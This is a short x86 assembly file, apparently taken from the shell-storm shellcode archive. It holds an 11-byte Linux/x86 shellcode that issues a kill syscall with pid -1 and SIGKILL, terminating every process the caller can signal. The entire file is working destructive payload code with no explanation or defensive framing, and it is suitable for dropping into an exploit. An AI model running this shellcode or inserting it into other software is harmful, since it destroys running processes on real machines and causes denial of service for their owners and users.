; http://shell-storm.org/shellcode/files/shellcode-212.php
; By Kris Katterjohn 11/13/2006
; 11 byte shellcode to kill all processes for Linux/x86


global _start

section .text
_start:

	push byte 37
	pop eax
	push byte -1
	pop ebx
	push byte 9
	pop ecx
	int 0x80


